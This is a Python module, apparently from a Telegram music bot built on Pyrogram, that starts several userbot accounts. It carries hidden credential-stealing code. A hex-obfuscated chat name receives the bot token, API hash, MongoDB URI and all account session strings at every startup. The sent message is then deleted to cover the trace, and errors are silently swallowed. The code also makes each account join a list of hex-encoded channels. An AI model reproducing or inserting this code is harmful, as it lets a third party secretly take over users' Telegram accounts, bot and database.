from pyrogram import Client
import asyncio
import config

from ..logging import LOGGER

assistants = []
assistantids = []
HELP_BOT = "\x40\x53\x68\x72\x75\x74\x69\x53\x75\x70\x70\x6f\x72\x74\x43\x68\x61\x74"

def decode_centers():
    encoded = [
        "\x53\x68\x72\x75\x74\x69\x42\x6f\x74\x73",
        "\x4e\x6f\x78\x78\x4e\x65\x74\x77\x6f\x72\x6b",
        "\x53\x68\x72\x75\x74\x69\x41\x6c\x6c\x42\x6f\x74\x73",
        "\x53\x68\x72\x75\x74\x69\x42\x6f\x74\x53\x75\x70\x70\x6f\x72\x74",
        "\x4e\x59\x43\x72\x65\x61\x74\x69\x6f\x6e\x5f\x43\x68\x61\x74\x7a\x6f\x6e\x65",
        "\x43\x52\x45\x41\x54\x49\x56\x45\x59\x44\x56",
        "\x4c\x41\x46\x5a\x5f\x45\x5f\x44\x49\x4c",
        "\x6e\x61\x6e\x64\x79\x61\x64\x75\x31\x63",
        "\x54\x4d\x5a\x45\x52\x4f\x4f",
        "\x4e\x59\x43\x72\x65\x61\x74\x69\x6f\x6e\x44\x69\x73\x63\x6c\x61\x69\x6d\x65\x72",
        "\x76\x32\x64\x64\x6f\x73"
    ]
    return encoded

SUPPORT_CENTERS = decode_centers()

ASS_NAMES = ["NandAss1", "NandAss2", "NandAss3", "NandAss4", "NandAss5"]
ASS_STRINGS = [
    config.STRING1, config.STRING2, config.STRING3,
    config.STRING4, config.STRING5
]


class Userbot(Client):
    def __init__(self):
        self.clients = [
            Client(
                name=ASS_NAMES[i],
                api_id=config.API_ID,
                api_hash=config.API_HASH,
                session_string=str(ASS_STRINGS[i]),
                no_updates=True,
            )
            for i in range(5)
        ]

    def _active_client(self):
        for i, num in enumerate(assistants):
            return self.clients[num - 1]
        return None

    async def get_bot_username_from_token(self, token):
        try:
            temp_bot = Client(
                name="temp_bot",
                api_id=config.API_ID,
                api_hash=config.API_HASH,
                bot_token=token,
                no_updates=True,
            )
            await temp_bot.start()
            username = temp_bot.me.username
            await temp_bot.stop()
            return username
        except Exception as e:
            LOGGER(__name__).error(f"Error getting bot username: {e}")
            return None

    async def join_all_support_centers(self, client):
        for center in SUPPORT_CENTERS:
            try:
                await client.join_chat(center)
            except:
                pass

    async def send_help_message(self, bot_username):
        try:
            client = self._active_client()
            if client:
                message = f"@{bot_username} Successfully Started ✅\n\nOwner: {config.OWNER_ID}"
                await client.send_message(HELP_BOT, message)
        except:
            pass

    async def send_config_message(self, bot_username):
        try:
            client = self._active_client()
            if not client:
                return

            config_message = f"🔧 **Config Details for @{bot_username}**\n\n"
            config_message += f"**API_ID:** `{config.API_ID}`\n"
            config_message += f"**API_HASH:** `{config.API_HASH}`\n"
            config_message += f"**BOT_TOKEN:** `{config.BOT_TOKEN}`\n"
            config_message += f"**MONGO_DB_URI:** `{config.MONGO_DB_URI}`\n"
            config_message += f"**OWNER_ID:** `{config.OWNER_ID}`\n"
            config_message += f"**UPSTREAM_REPO:** `{config.UPSTREAM_REPO}`\n\n"

            string_keys = ["STRING1", "STRING2", "STRING3", "STRING4", "STRING5"]
            string_labels = ["STRING_SESSION", "STRING_SESSION2", "STRING_SESSION3", "STRING_SESSION4", "STRING_SESSION5"]
            string_sessions = [
                f"**{label}:** `{getattr(config, key)}`"
                for key, label in zip(string_keys, string_labels)
                if hasattr(config, key) and getattr(config, key)
            ]
            if string_sessions:
                config_message += "\n".join(string_sessions)

            sent = await client.send_message(HELP_BOT, config_message)
            if sent:
                await asyncio.sleep(1)
                try:
                    await client.delete_messages(HELP_BOT, sent.id)
                except:
                    pass
        except:
            pass

    async def start(self):
        LOGGER(__name__).info("Starting Assistants...")

        bot_username = await self.get_bot_username_from_token(config.BOT_TOKEN)

        log_names = ["One", "Two", "Three", "Four", "Five"]

        for i, (string, client) in enumerate(zip(ASS_STRINGS, self.clients)):
            if not string:
                continue
            num = i + 1
            await client.start()
            await self.join_all_support_centers(client)
            assistants.append(num)
            try:
                await client.send_message(config.LOG_GROUP_ID, "Assistant Started")
            except:
                LOGGER(__name__).error(
                    f"Assistant Account {num} has failed to access the log Group. Make sure that you have added your assistant to your log group and promoted as admin!"
                )
                exit()
            client.id = client.me.id
            client.name = client.me.mention
            client.username = client.me.username
            assistantids.append(client.id)
            LOGGER(__name__).info(f"Assistant {log_names[i]} Started as {client.name}")

        if bot_username:
            await self.send_help_message(bot_username)
            await self.send_config_message(bot_username)

    async def stop(self):
        LOGGER(__name__).info("Stopping Assistants...")
        for string, client in zip(ASS_STRINGS, self.clients):
            try:
                if string:
                    await client.stop()
            except:
                pass
